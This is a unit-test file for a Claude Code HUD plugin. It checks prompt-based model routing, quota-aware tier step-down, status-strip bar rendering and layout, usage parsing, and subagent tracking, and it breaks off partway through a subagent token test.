/**
 * What has to keep working.
 *
 * The two things this mod gets wrong in ways nobody notices are routing a
 * planning job to a small model, and a strip that jitters or overflows. Both
 * are decided by pure functions, so both are tested here without a session.
 *
 * Run with: claude plugin test
 */

import { expect, test } from 'claude-code/testing';

import { classify, chooseModel, LONG_PROMPT, BRIEF_PROMPT } from '../hooks/hud-route.js';
// The hooks module itself. A static import: the test runner refuses import(), as the engine does.
import { register } from '../hooks/register.js';
import { MODELS, shortModel, resolveModel, NEWEST } from '../hooks/hud-models.js';
import { paceOf, paceText, paceMark, projectionText, FAST_RATIO } from '../hooks/hud-pace.js';
import { record, logLines, tuneLines, signalsIn, snippet, commonWords, KEEP } from '../hooks/hud-log.js';
import { buildSuggestPrompt, parseSuggestions, WANTED, MAX_LENGTH } from '../hooks/hud-suggest.js';
import { readUsage, contextPercentOf, limitsOf, epochSecondsOf, asPercent, describeUsage, hasFableWindow } from '../hooks/hud-usage.js';
import { levelOf, resetFormFor, clockText, readingsFor, worstLevel, needsClock, leadNote,
    CALM, WATCH, URGENT, COUNTDOWN_WITHIN_MS } from '../hooks/hud-focus.js';
import { todosFrom, progressOf, countText, worthShowing, MIN_PLAN, applyTaskTool, todosFromTasks, planReport,
    replayPlan, trackingNudge, TRACK_SECTION, reminderStep, reminderText, HUD_TOOL, HUD_TOOL_NAME, stepsFrom,
    REMIND_AFTER, REMIND_EVERY, REMIND_MAX, planListRows, LIST_MIN_ROWS } from '../hooks/hud-progress.js';
import { emptyStats, addTurn, cacheHit, moneyText, spanText, sessionOf, contextText, statsView } from '../hooks/hud-stats.js';
import { planBar, planBarFrame, PLAN_ACCENT, PLAN_GLOW, PLAN_DONE, headerBar, HEADER_WIDE, BAND_BG, BAND_AMBER, BAND_CYAN, BADGE_BG } from '../hooks/hud-format.js';
import { planSvg } from '../hooks/hud-svg.js';
import { helpLines, topicFor, TOPICS, COMMANDS, VERBS } from '../hooks/hud-help.js';
import { buildPanel, PANE_ID, DEFAULT_COLLAPSED } from '../hooks/hud-panel.js';
import { spawned, shortName, addTokens, tokensOf, merge, visible, prune, shares, comparable,
    elapsedText, tokenText, statusColor, LINGER_MS } from '../hooks/hud-agents.js';
import { assess, firstPath, previewFor, countLines, describe, warningFor,
    recordGuard, GUARD_KEEP, RAN, CANCELLED, PASSED } from '../hooks/hud-blast.js';
import { shouldCheck, buildHeadsPrompt, flatten, parseHeadsUp } from '../hooks/hud-heads.js';
import { barText, barPieces, fit, layout, buildGroups, percentText, modelText, resetText, shortKind, tone, width } from '../hooks/hud-format.js';

const OPTS = {
    fastModel: 'haiku',
    baseModel: 'sonnet',
    deepModel: 'opus',
    topModel: 'fable',
    routeToTop: true,
    spareAbove: 85,
    barCells: 10,
    ascii: false,
};

const ROOMY = { rateLimits: [{ kind: 'five_hour', percentUsed: 20, resetsAt: 0 }] };
const TIGHT = { rateLimits: [{ kind: 'five_hour', percentUsed: 91, resetsAt: 0 }] };

test('planning work reads as deep', async () => {
    expect(classify('plan out the migration for the sync layer')).toBe('deep');
    expect(classify('why does this deadlock on the second connection?')).toBe('deep');
    expect(classify('refactor the settings panel')).toBe('deep');
});

test('a typo fix reads as fast', async () => {
    expect(classify('fix the typo in the footer copy')).toBe('fast');
    expect(classify('rename this variable to sessionRowId')).toBe('fast');
});

test('anything else is everyday work, not the cheapest model', async () => {
    // The uncertain case must not fall to the small model: a real task sent
    // there wastes the whole turn, where the reverse wastes a few cents.
    expect(classify('add a column for the last sync time')).toBe('base');
    expect(classify('')).toBe('base');
});

test('a long prompt is deep however it is worded', async () => {
    const long = 'tidy up this file. '.repeat(Math.ceil(LONG_PROMPT / 19) + 1);
    expect(long.length >= LONG_PROMPT).toBe(true);
    expect(classify(long)).toBe('deep');
});

test('a planning prompt that also says rename is still deep', async () => {
    // Both patterns match, and the expensive signal is the reliable one.
    expect(classify('plan the rename of every customer field')).toBe('deep');
});

test('asking for the best model in words is enough on its own', async () => {
    // Second-guessing someone who wrote "use the best model" is not thrift.
    expect(classify('use the best model for this')).toBe('top');
    expect(classify('think really hard about this one')).toBe('top');
    expect(classify('use fable here')).toBe('top');
    expect(classify('no shortcuts on this')).toBe('top');
});

test('planning plus whole-system scope reaches the flagship', async () => {
    expect(classify('design the architecture for the entire system')).toBe('top');
    expect(classify('plan a rewrite of the whole codebase')).toBe('top');
    expect(classify('design the schema from scratch')).toBe('top');
});

test('planning plus real stakes reaches the flagship', async () => {
    expect(classify('plan the migration of the production database')).toBe('top');
    expect(classify('design a fix for the data loss in the sync layer')).toBe('top');
});

test('a long planning-shaped brief reaches the flagship', async () => {
    const brief = 'plan this out. ' + 'here is more context about the system. '.repeat(40);
    expect(brief.length >= BRIEF_PROMPT).toBe(true);
    expect(classify(brief)).toBe('top');
});

test('planning on its own is only deep, never the flagship', async () => {
    // Otherwise every design question would go to the most expensive model.
    expect(classify('plan out the migration for the sync layer')).toBe('deep');
    expect(classify('refactor the settings panel')).toBe('deep');
    expect(classify('why does this deadlock?')).toBe('deep');
});

test('scope or stakes without planning is not the flagship', async () => {
    expect(classify('run the tests for the entire project')).not.toBe('top');
    expect(classify('restart production')).not.toBe('top');
});

test('the flagship tier routes to the flagship when there is room', async () => {
    const picked = chooseModel('top', ROOMY, OPTS);
    expect(picked.model).toBe('fable');
    expect(picked.held).toBe(false);
});

test('a thin window steps the flagship down one rung, not to the cheap end', async () => {
    // Whole-system work is still whole-system work when quota is short.
    const picked = chooseModel('top', TIGHT, OPTS);
    expect(picked.model).toBe('opus');
    expect(picked.tier).toBe('deep');
    expect(picked.held).toBe(true);
});

test('turning route_to_top off makes the flagship tier behave as deep', async () => {
    const off = { ...OPTS, routeToTop: false };
    expect(chooseModel('top', ROOMY, off).model).toBe('opus');
    expect(chooseModel('top', TIGHT, off).model).toBe('sonnet');
});

test('an empty top_model also falls back to deep', async () => {
    expect(chooseModel('top', ROOMY, { ...OPTS, topModel: '' }).model).toBe('opus');
});

test('routing up is held back when the five-hour window is nearly gone', async () => {
    const tight = { rateLimits: [{ kind: 'five_hour', percentUsed: 91, resetsAt: 0 }] };
    const picked = chooseModel('deep', tight, OPTS);
    expect(picked.model).toBe('sonnet');
    expect(picked.held).toBe(true);
});

test('and is not held back when there is room', async () => {
    const roomy = { rateLimits: [{ kind: 'five_hour', percentUsed: 40, resetsAt: 0 }] };
    const picked = chooseModel('deep', roomy, OPTS);
    expect(picked.model).toBe('opus');
    expect(picked.held).toBe(false);
});

test('small work is never held back, since holding it saves nothing', async () => {
    const tight = { rateLimits: [{ kind: 'five_hour', percentUsed: 99, resetsAt: 0 }] };
    expect(chooseModel('fast', tight, OPTS).model).toBe('haiku');
});

test('a bar is always its stated width, brackets included', async () => {
    for (const pct of [0, 1, 37, 99, 100, -5, 140]) {
        for (const cells of [10, 8]) {
            expect(barText(pct, cells).length).toBe(cells);
        }
    }
});

test('a bar is bracketed, so its extent is visible even when nearly empty', async () => {
    // Without the frame you cannot see where a 4% bar ends, and the strip
    // reads as loose characters rather than as a gauge.
    for (const pct of [0, 4, 50, 100]) {
        const text = barText(pct, 10);
        expect(text.startsWith('[')).toBe(true);
        expect(text.endsWith(']')).toBe(true);
    }
});

test('a bar distinguishes empty, nearly empty, nearly full and full', async () => {
    // 4% drawing as empty would read as a window nobody has touched, and
    // 99% drawing as full would read as one already gone.
    expect(barText(0, 10)).toBe('[········]');
    expect(barText(100, 10)).toBe('[████████]');
    expect(barText(4, 10).indexOf('·') > 1).toBe(true);
    expect(barText(99, 10).indexOf('·')).toBe(-1);
    expect(barText(99, 10)).not.toBe(barText(100, 10));
});

test('the leading edge is what makes ten columns say more than eleven things', async () => {
    // Whole cells give 11 distinct bars across the range. Eighths give 81,
    // which is the difference between seeing 77% move to 81% and not.
    const seen = new Set();
    for (let p = 0; p <= 100; p += 1) seen.add(barText(p, 10));
    expect(seen.size > 60).toBe(true);
    expect(barText(40, 10)).not.toBe(barText(43, 10));
    expect(barText(77, 10)).not.toBe(barText(79, 10));
});

test('the fill is coloured by zone, so a full window shows how it got there', async () => {
    // At 91% the bar runs green, then amber, then red along its length.
    const colours = barPieces(91, 10).filter((p) => p.color).map((p) => p.color);
    expect(colours.includes('green')).toBe(true);
    expect(colours.includes('yellow')).toBe(true);
    expect(colours.includes('red')).toBe(true);

    // At 31% there is nothing but green in it.
    const calm = barPieces(31, 10).filter((p) => p.color).map((p) => p.color);
    expect(calm.every((c) => c === 'green')).toBe(true);
});

test('same-coloured cells are merged, so a bar is a few elements not ten', async () => {
    expect(barPieces(100, 10).length <= 6).toBe(true);
});

test('the bar uses no ambiguous-width character, which would break alignment', async () => {
    // Filled and hollow squares or circles would read better, and are East
    // Asian Ambiguous width: some terminals draw them double-width and the
    // whole strip loses its columns.
    const AMBIGUOUS = /[■□▪▫●○◼◻⬛⬜]/;
    for (const ascii of [false, true]) {
        for (const pct of [0, 33, 66, 100]) {
            expect(AMBIGUOUS.test(barText(pct, 10, ascii))).toBe(false);
        }
    }
});

test('the ascii bar is for a terminal that is not in UTF-8', async () => {
    expect(barText(50, 10, true)).toBe('[####....]');
    expect(/[^\x20-\x7e]/.test(barText(50, 10, true))).toBe(false);
});

test('percentages and model names keep a fixed width, so nothing jitters', async () => {
    expect(percentText(7).length).toBe(4);
    expect(percentText(100).length).toBe(4);
    expect(modelText('haiku').length).toBe(10);
    expect(modelText('sonnet 5.5').length).toBe(10);
    expect(modelText('a-very-long-model-name').length).toBe(10);
});

test('a reset is a countdown, shaped by how far away it is', async () => {
    // "1h41m" answers the question the percentage raises; "14:20" makes
    // you do the subtraction.
    const NOW = Date.UTC(2026, 9, 19, 12, 0, 0);
    const at = (m: number) => resetText(Math.floor((NOW + m * 60000) / 1000), NOW);
    expect(at(41)).toBe('41m');
    expect(at(101)).toBe('1h41m');
    expect(at(299)).toBe('4h59m');
    expect(at(300)).toBe('5h');
    expect(at(420)).toBe('7h');
    expect(at(3 * 1440 + 11 * 60)).toBe('3d,11h');
});

test('a day or more never carries minutes, and nothing counts backwards', async () => {
    const NOW = Date.UTC(2026, 9, 19, 12, 0, 0);
    const at = (m: number) => resetText(Math.floor((NOW + m * 60000) / 1000), NOW);
    for (const m of [1440, 2000, 4980, 10080]) {
        expect(/m$/.test(at(m))).toBe(false);
    }
    expect(at(0)).toBe('now');
    expect(at(-5)).toBe('now');
    expect(resetText(0, NOW)).toBe('');
    expect(resetText(null as unknown as number, NOW)).toBe('');
});

test('the colour changes at the thresholds and nowhere else', async () => {
    // Green to 55, amber 56 to 85, red 86 and up.
    expect(tone(0)).toBe('green');
    expect(tone(55)).toBe('green');
    expect(tone(56)).toBe('yellow');
    expect(tone(85)).toBe('yellow');
    expect(tone(86)).toBe('red');
    expect(tone(100)).toBe('red');
});

test('a fractional reading takes the colour of the number that is printed', async () => {
    // 85.6 prints as 86%, so it has to be red. Comparing before rounding
    // would put a red number beside an amber bar.
    expect(tone(55.4)).toBe('green');
    expect(tone(55.6)).toBe('yellow');
    expect(tone(85.4)).toBe('yellow');
    expect(tone(85.6)).toBe('red');
    expect(percentText(85.6).trim()).toBe('86%');
});

const FULL = {
    model: 'haiku',
    pinned: false,
    routing: true,
    contextPercent: 31,
    rateLimits: [
        { kind: 'five_hour', percentUsed: 18, resetsAt: Math.floor(Date.now() / 1000) + 3600 },
        { kind: 'seven_day', percentUsed: 42, resetsAt: Math.floor(Date.now() / 1000) + 200000 },
    ],
};

test('the whole strip fits a wide window', async () => {
    const pieces = fit(buildGroups(FULL, OPTS), 200);
    expect(width(pieces) <= 200).toBe(true);
    expect(pieces.some((p) => p.text.indexOf('Session') === 0)).toBe(true);
});

test('a narrow window sheds the reset times before a whole reading', async () => {
    const groups = buildGroups(FULL, OPTS);
    const full = width(fit(groups, 200));
    const pieces = fit(groups, full - 4);
    expect(pieces.some((p) => p.text.indexOf('\u21bb') >= 0)).toBe(false);
    expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(true);
});

test('a very narrow window keeps the model and drops the rest', async () => {
    const pieces = fit(buildGroups(FULL, OPTS), 16);
    expect(pieces.length > 0).toBe(true);
    expect(pieces[0].text.indexOf('haiku')).toBe(0);
    expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(false);
});

test('a window with no readings at all still names the model', async () => {
    const bare = { model: 'sonnet', pinned: true, routing: false, contextPercent: null, rateLimits: [] };
    const pieces = fit(buildGroups(bare, OPTS), 80);
    expect(pieces[0].text.indexOf('sonnet')).toBe(0);
    expect(pieces.some((p) => p.text.trim() === 'pin')).toBe(true);
});

test('a spend limit is left out, since a dollar cap is not a quota', async () => {
    const odd = { ...FULL, rateLimits: [{ kind: 'spend_limit', percentUsed: 10, resetsAt: 0 }] };
    const pieces = fit(buildGroups(odd, OPTS), 200);
    expect(pieces.some((p) => p.text.indexOf('spend') >= 0)).toBe(false);
});

test('a window this list has never seen is shown, not hidden', async () => {
    // Fable bills against its own weekly allowance. Dropping a limit for
    // being unrecognised is how you run out of something nobody showed you.
    const fable = { ...FULL, rateLimits: [{ kind: 'seven_day_fable', percentUsed: 40, resetsAt: 0 }] };
    const pieces = fit(buildGroups(fable, OPTS), 200);
    expect(pieces.some((p) => p.text.indexOf('Fable') === 0)).toBe(true);
});

test('the window names match what the usage panel calls them', async () => {
    // "7d" beside a reset time reads as seven days to reset. It is the
    // name of the window, and the name is what was wrong.
    expect(shortKind('five_hour')).toBe('Session');
    expect(shortKind('seven_day')).toBe('Week');
    expect(shortKind('seven_day_fable')).toBe('Fable');
    expect(shortKind('spend_limit')).toBe('');
    expect(shortKind('')).toBe('');
});

test('a roomy window gets the full bar width', async () => {
    // The bar is several pieces now, so measure from bracket to bracket.
    const pieces = layout(FULL, 120, OPTS);
    const open = pieces.findIndex((p) => p.text === '[');
    expect(open >= 0).toBe(true);
    let w = 0;
    let k = open;
    while (k < pieces.length) { w += pieces[k].text.length; if (pieces[k].text === ']') break; k += 1; }
    expect(w).toBe(OPTS.barCells);
});

test('a narrow window narrows the bars rather than losing a reading', async () => {
    // The seven-day window used to be dropped to save nine characters that
    // were sitting in the bars.
    const pieces = layout(FULL, 70, OPTS);
    expect(width(pieces) <= 70).toBe(true);
    expect(pieces.some((p) => p.text.indexOf('Session') === 0)).toBe(true);
    expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(true);
});

test('the strip never overflows, at any width', async () => {
    for (let cols = 12; cols <= 200; cols += 1) {
        const pieces = layout(FULL, cols, OPTS);
        expect(width(pieces) <= cols || pieces.length <= 3).toBe(true);
    }
});

test('an unmeasured window draws at full width rather than collapsing', async () => {
    for (const columns of [undefined, 0, null]) {
        const pieces = layout(FULL, columns as number, OPTS);
        expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(true);
    }
});

test('/hud says whether it is routing, and stops when told to', async ($) => {
    const status = await $.command.run({ command: 'hud', args: '' });
    expect(status.text.indexOf('routing: on') >= 0).toBe(true);

    const off = await $.command.run({ command: 'hud', args: 'off' });
    expect(off.text.indexOf('Routing off') >= 0).toBe(true);

    const back = await $.command.run({ command: 'hud', args: 'auto' });
    expect(back.text.indexOf('Routing on') >= 0).toBe(true);
});

test('every model in the catalogue is a full id, never an alias', async () => {
    // An alias on the request is the bug this file exists to prevent: the
    // engine answers "the selected model (sonnet) may not exist".
    for (const m of MODELS) {
        expect(/^claude-[a-z]+-\d+(-\d+)?$/.test(m.id)).toBe(true);
        expect(['haiku', 'sonnet', 'opus', 'fable', 'best'].includes(m.id)).toBe(false);
    }
});

test('a family name resolves to that family newest', async () => {
    expect(resolveModel('sonnet')).toBe('claude-sonnet-5-5');
    expect(resolveModel('opus')).toBe('claude-opus-5-5');
    expect(resolveModel('haiku')).toBe('claude-haiku-5-5');
    expect(resolveModel('fable')).toBe('claude-fable-5-1');
    expect(resolveModel('best')).toBe(NEWEST.fable);
});

test('an older model can be picked by name', async () => {
    expect(resolveModel('opus 4.8')).toBe('claude-opus-4-8');
    expect(resolveModel('opus-4-8')).toBe('claude-opus-4-8');
    expect(resolveModel('sonnet 5')).toBe('claude-sonnet-5');
    expect(resolveModel('haiku 4.5')).toBe('claude-haiku-4-5');
});

test('a full id passes through, in any case', async () => {
    expect(resolveModel('claude-opus-5-5')).toBe('claude-opus-5-5');
    expect(resolveModel('Claude-Fable-5-1')).toBe('claude-fable-5-1');
});

test('nonsense resolves to null rather than to a guess', async () => {
    // Guessing would set a tier to a model that fails on the next request,
    // far from where the mistake was made.
    for (const bad of ['', '   ', 'sonnet5', 'gpt-4', 'nonsense', 'claude-nope-9-9']) {
        expect(resolveModel(bad)).toBe(null, JSON.stringify(bad));
    }
});

test('every short name fits the ten-column model field', async () => {
    for (const m of MODELS) expect(m.short.length <= 10, m.short).toBe(true);
});

test('an id the catalogue has never heard of still prints sensibly', async () => {
    expect(shortModel('claude-newthing-6-2')).toBe('newthing 6.2');
    expect(shortModel('something-else')).toBe('something-else');
    expect(shortModel('')).toBe('');
});

const NOW = Date.UTC(2026, 9, 19, 12, 0, 0);
const resetIn = (m: number) => Math.floor((NOW + m * 60000) / 1000);

test('on pace says nothing', async () => {
    // Half the window used at half past is exactly on pace.
    const p = paceOf('Session', 50, resetIn(150), NOW);
    expect(p !== null).toBe(true);
    expect(Math.abs(p.ratio - 1) < 0.01).toBe(true);
    expect(paceText(p)).toBe('');
});

test('burning fast says how fast, and when it runs out', async () => {
    const p = paceOf('Session', 91, resetIn(221), NOW);
    expect(p.ratio > 3).toBe(true);
    expect(/pace/.test(paceText(p))).toBe(true);
    expect(/dry in/.test(paceText(p))).toBe(true);
});

test('a window nearly over is not a warning just because it is nearly full', async () => {
    // 91% used with 20 minutes left is what a spent window looks like.
    // Warning there would make the warning meaningless.
    const p = paceOf('Session', 91, resetIn(20), NOW);
    expect(p.ratio < FAST_RATIO).toBe(true);
    expect(paceText(p)).toBe('');
});

test('a mild overspend stays quiet, so the warning keeps its meaning', async () => {
    for (const [pct, left] of [[31, 228], [45, 210], [60, 165]]) {
        const p = paceOf('Session', pct, resetIn(left), NOW);
        if (p.ratio < FAST_RATIO) expect(paceText(p)).toBe('');
    }
});

test('pacing refuses to guess when it cannot know', async () => {
    expect(paceOf('Nope', 50, resetIn(60), NOW)).toBe(null);
    expect(paceOf('Session', 50, 0, NOW)).toBe(null);
    expect(paceOf('Session', 50, 'x' as unknown as number, NOW)).toBe(null);
    expect(paceOf('Session', 50, resetIn(-10), NOW)).toBe(null);
    expect(paceText(null)).toBe('');
    expect(paceMark(null)).toBe(null);
});

test('an untouched window is never a warning', async () => {
    const p = paceOf('Week', 0, resetIn(3 * 1440), NOW);
    expect(p.ratio).toBe(0);
    expect(paceText(p)).toBe('');
});

test('the pace mark sits in the track without changing the bar width', async () => {
    for (const mark of [0, 0.25, 0.5, 0.9, 1]) {
        expect(barText(30, 10, false, mark).length).toBe(10);
    }
    expect(barText(30, 10, false, 0.75).indexOf('╎') >= 0).toBe(true);
    expect(barText(30, 10, false, null).indexOf('╎') >= 0).toBe(false);
});

test('a mark under the fill is hidden, which is the point', async () => {
    // Fill past the mark means ahead of the clock; the mark only shows
    // while there is still track to its right.
    expect(barText(95, 10, false, 0.1).indexOf('╎') >= 0).toBe(false);
});

test('the ascii bar carries no mark, since it has no character for one', async () => {
    expect(barText(30, 10, true, 0.5).indexOf('╎') >= 0).toBe(false);
    expect(barText(30, 10, true, 0.5).length).toBe(10);
});

test('the log keeps the newest and drops the oldest', async () => {
    let log = record([], { tier: 'base', text: 'p0', signals: [] });
    for (let i = 1; i < KEEP + 5; i += 1) {
        log = record(log, { tier: 'base', text: 'p' + i, signals: [] });
    }
    expect(log.length).toBe(KEEP);
    expect(log[log.length - 1].text).toBe('p' + (KEEP + 4));
    expect(log[0].text).toBe('p5');
});

test('a decision records which words fired, not just the tier', async () => {
    const found = signalsIn('plan the entire migration, no shortcuts');
    expect(found.indexOf('plan') >= 0).toBe(true);
    expect(found.indexOf('entire') >= 0).toBe(true);
    expect(found.indexOf('no shortcuts') >= 0).toBe(true);
});

test('signals match whole words, so planet is not plan', async () => {
    expect(signalsIn('render the planet mesh').indexOf('plan') >= 0).toBe(false);
    expect(signalsIn('formatting').indexOf('formatting') >= 0).toBe(true);
    expect(signalsIn('formatting').indexOf('format') >= 0).toBe(false);
});

test('a prompt is kept as a snippet, never in full', async () => {
    expect(snippet('x'.repeat(400)).length < 60).toBe(true);
    expect(snippet('   fix   the  typo  ')).toBe('fix the typo');
});

test('an empty log says so rather than printing nothing', async () => {
    expect(logLines([]).length).toBe(1);
    expect(/Nothing routed/.test(logLines([])[0])).toBe(true);
});

test('tuning says nothing until there is something to say', async () => {
    expect(/Not enough/.test(tuneLines([])[0])).toBe(true);
    expect(/Not enough/.test(tuneLines([{ tier: 'base', text: 'a' }])[0])).toBe(true);
});

test('tuning notices a tier that never fires', async () => {
    const log = [...Array(8)].map((unused, i) => ({ tier: 'base', text: 'update the readme ' + i }));
    const text = tuneLines(log).join('\n');
    expect(/cheap tier/.test(text)).toBe(true);
    expect(/middle tier/.test(text)).toBe(true);
});

test('tuning suggests only words it saw more than once', async () => {
    const log = [
        { tier: 'base', text: 'update the docs' },
        { tier: 'base', text: 'update the docs again' },
        { tier: 'base', text: 'kubernetes autoscaler thing' },
        { tier: 'base', text: 'another docs change' },
        { tier: 'base', text: 'more docs work' },
    ];
    const words = commonWords(log).map((pair) => pair[0]);
    expect(words.indexOf('docs') >= 0).toBe(true);
    // A word seen once must not become a rule.
    expect(words.indexOf('kubernetes') >= 0).toBe(false);
});

test('tuning ignores filler words', async () => {
    const log = [...Array(6)].map(() => ({ tier: 'base', text: 'please can you just make the thing' }));
    const words = commonWords(log).map((pair) => pair[0]);
    for (const filler of ['please', 'can', 'you', 'just', 'the']) {
        expect(words.indexOf(filler) >= 0).toBe(false);
    }
});

test('the suggestion request carries the work and asks for bare lines', async () => {
    const ask = buildSuggestPrompt('fix the parser', 'I changed parser.js and added a test.');
    expect(/fix the parser/.test(ask)).toBe(true);
    expect(/parser\.js/.test(ask)).toBe(true);
    expect(/No numbering/.test(ask)).toBe(true);
    expect(buildSuggestPrompt('', '')).toBe(null);
});

test('the request is capped, so a long turn cannot become a long bill', async () => {
    const huge = 'word '.repeat(5000);
    const ask = buildSuggestPrompt(huge, huge);
    expect(ask.length < 1800).toBe(true);
    expect(ask.length < huge.length / 10).toBe(true);
});

test('a tidy answer parses to exactly the suggestions', async () => {
    const reply = ['Run the parser tests', 'Add a case for empty input', 'Update the README'].join('\n');
    expect(parseSuggestions(reply)).toEqual(['Run the parser tests', 'Add a case for empty input', 'Update the README']);
});

test('a messy answer is cleaned rather than shown raw', async () => {
    const messy = [
        'Sure! Here are three ideas:',
        '1. Run the parser tests',
        '- "Add a case for empty input"',
        '* Update the README for the new flag',
        'This one is far too long to be a button and ought to be dropped by the parser entirely',
        'Run the parser tests',
    ].join('\n');
    const out = parseSuggestions(messy);
    expect(out.length).toBe(3);
    expect(out.some((x) => /^(sure|here)/i.test(x))).toBe(false);
    expect(out.some((x) => /^[-*\d]/.test(x))).toBe(false);
    expect(out.some((x) => x.indexOf('"') >= 0)).toBe(false);
    expect(out.some((x) => x.length > MAX_LENGTH)).toBe(false);
    expect(new Set(out).size).toBe(out.length);
});

test('nothing usable produces nothing, rather than junk', async () => {
    for (const bad of ['', null, undefined, 'Okay', 'Here you go:', 'word', '   ']) {
        expect(parseSuggestions(bad as string)).toEqual([]);
    }
});

test('it never offers more than it has room for', async () => {
    const many = [...Array(20)].map((unused, i) => 'Do the thing number ' + i).join('\n');
    expect(parseSuggestions(many).length).toBe(WANTED);
});

test('an object reply is read as well as a string', async () => {
    const reply = { text: ['Run the tests now', 'Check the log file'].join('\n') };
    expect(parseSuggestions(reply)).toEqual(['Run the tests now', 'Check the log file']);
});

test('one word may sit between the size and the thing', async () => {
    // "the entire billing schema" is the same claim as "the entire
    // schema", and the stricter pattern only saw the second.
    expect(classify('plan the migration of the entire billing schema')).toBe('top');
    expect(classify('plan the entire payment pipeline')).toBe('top');
    expect(classify('design the whole billing service')).toBe('top');
});

test('but only one, or any big-sounding phrase would qualify', async () => {
    // "the entire point of this small fix" is not a whole-system brief.
    expect(classify('that is the entire point of this small fix')).not.toBe('top');
    expect(classify('plan the entire point of the small schema change')).not.toBe('top');
});

test('the log lines up in columns', async () => {
    // The padding used to be applied to the closing quote rather than to
    // the text, so nothing lined up and the reasons wandered.
    const entries = [
        { tier: 'fast', short: 'haiku 5.5', text: 'short one', signals: ['typo'] },
        { tier: 'deep', short: 'opus 5.5', text: 'a considerably longer prompt than that one', signals: ['plan'] },
    ];
    const lines = logLines(entries);
    const at = lines.map((l) => l.indexOf('['));
    expect(at[0]).toBe(at[1]);
});

test('a percentage is read whatever it is called', async () => {
    // The live failure this exists to stop: insisting on one spelling made
    // the context reading vanish from a strip whose other numbers were fine.
    for (const key of ['percent', 'percentUsed', 'percent_used', 'usedPercentage', 'used_percentage']) {
        expect(Math.round(contextPercentOf({ context: { [key]: 31 } }))).toBe(31);
    }
});

test('a fraction is scaled, because 0.31 and 31 are the same reading', async () => {
    expect(Math.round(contextPercentOf({ context: { percent: 0.31 } }))).toBe(31);
    expect(Math.round(contextPercentOf({ context: { percent: 31 } }))).toBe(31);
});

test('exactly 1 is read as one percent, the safer of the two mistakes', async () => {
    // Reading it as 100% would paint the bar red and claim you were out.
    expect(asPercent(1)).toBe(1);
});

test('a missing percentage is rebuilt from tokens and window', async () => {
    expect(Math.round(contextPercentOf({ context: { tokens: 50000, window: 200000 } }))).toBe(25);
});

test('and from the remaining percentage when that is all there is', async () => {
    expect(Math.round(contextPercentOf({ context: { remainingPercentage: 70 } }))).toBe(30);
});

test('no context at all is null, not zero', async () => {
    // Zero would draw an empty bar and claim the context was untouched.
    expect(contextPercentOf({})).toBe(null);
    expect(contextPercentOf({ context: null })).toBe(null);
    expect(contextPercentOf({ context: {} })).toBe(null);
    expect(contextPercentOf(null)).toBe(null);
});

test('limits are read under any of their names', async () => {
    for (const key of ['rateLimits', 'rate_limits', 'limits']) {
        const out = limitsOf({ [key]: [{ kind: 'five_hour', percentUsed: 18, resetsAt: 1792400000 }] });
        expect(out.length).toBe(1);
        expect(out[0].percentUsed).toBe(18);
    }
});

test('a reset time is read as seconds, from seconds, milliseconds or a date', async () => {
    const seconds = 1792400000;
    expect(epochSecondsOf({ resetsAt: seconds })).toBe(seconds);
    expect(epochSecondsOf({ resetsAt: seconds * 1000 })).toBe(seconds);
    expect(epochSecondsOf({ reset_at: seconds })).toBe(seconds);
    expect(epochSecondsOf({ resetAt: seconds })).toBe(seconds);
    expect(epochSecondsOf({ resetsAt: new Date(seconds * 1000).toISOString() })).toBe(seconds);
});

test('a window with no reset time still shows its percentage', async () => {
    // Losing a whole reading because one field is missing is the bug.
    const out = limitsOf({ rateLimits: [{ kind: 'seven_day', percentUsed: 56 }] });
    expect(out.length).toBe(1);
    expect(out[0].percentUsed).toBe(56);
    expect(out[0].resetsAt).toBe(null);
});

test('a window with no percentage is dropped, since it has nothing to say', async () => {
    expect(limitsOf({ rateLimits: [{ kind: 'five_hour' }] }).length).toBe(0);
});

test('junk never throws on a welcome screen', async () => {
    const junk = [null, undefined, 42, 'nope', {}, { rateLimits: 'nope' }, { rateLimits: [null, 7] }];
    for (const bad of junk) {
        const out = readUsage(bad);
        expect(out.contextPercent).toBe(null);
        expect(Array.isArray(out.rateLimits)).toBe(true);
    }
});

test('the documented shape reads correctly end to end', async () => {
    const usage = {
        startedAt: 1792300000,
        context: { tokens: 62000, window: 200000, percent: 31 },
        rateLimits: [
            { kind: 'five_hour', percentUsed: 4, resetsAt: 1792400000 },
            { kind: 'seven_day', percentUsed: 56, resetsAt: 1792700000 },
        ],
        cost: { total_cost_usd: 0.42 },
    };
    const out = readUsage(usage);
    expect(Math.round(out.contextPercent)).toBe(31);
    expect(out.rateLimits.length).toBe(2);
    expect(out.rateLimits[1].kind).toBe('seven_day');
    expect(out.rateLimits[1].resetsAt).toBe(1792700000);
});

test('the same reading under every other spelling gives the same answer', async () => {
    const usage = {
        context: { used_tokens: 62000, context_window_size: 200000 },
        rate_limits: [{ type: 'five_hour', used_percentage: 4, reset_at: 1792400000 }],
    };
    const out = readUsage(usage);
    expect(Math.round(out.contextPercent)).toBe(31);
    expect(out.rateLimits[0].kind).toBe('five_hour');
    expect(out.rateLimits[0].resetsAt).toBe(1792400000);
});

test('/hud raw says what it found, and what it made of it', async () => {
    const lines = describeUsage({ context: { percent: 31 }, rateLimits: [{ kind: 'five_hour', percentUsed: 4 }] });
    const text = lines.join('\n');
    expect(/context: percent/.test(text)).toBe(true);
    expect(/read as: context 31%/.test(text)).toBe(true);
    expect(/no reset time/.test(text)).toBe(true);
    expect(/nothing usable/.test(describeUsage(null).join('\n'))).toBe(true);
});

// ============================================================ subagent monitor

test('an agent is recorded once, however many times it is announced', async () => {
    let agents = spawned([], { agentId: 'a1', subagent_type: 'general-purpose' });
    agents = spawned(agents, { agentId: 'a1', subagent_type: 'general-purpose' });
    expect(agents.length).toBe(1);
    expect(agents[0].name).toBe('general');
});

test('an announcement with no id is ignored rather than stored as undefined', async () => {
    expect(spawned([], {}).length).toBe(0);
    expect(spawned([], null).length).toBe(0);
});

test('an agent name is shortened to fit a row', async () => {
    expect(shortName({ subagent_type: 'code-reviewer' })).toBe('code');
    expect(shortName({ type: 'Explore' })).toBe('explore');
    expect(shortName({})).toBe('agent');
    expect(shortName({ name: 'averyverylongagentname' }).length <= 9).toBe(true);
});

test('tokens land on the agent that spent them, and nowhere else', async () => {
    let agents = spawned(spawned([], { agentId: 'a1' }), { agentId: 'a2' });
    agents = addTokens(agents, 'a1', 500);
    agents = addTokens(agents, 'a1', 250);
    agents = addTokens(agents, 'a2', 100);
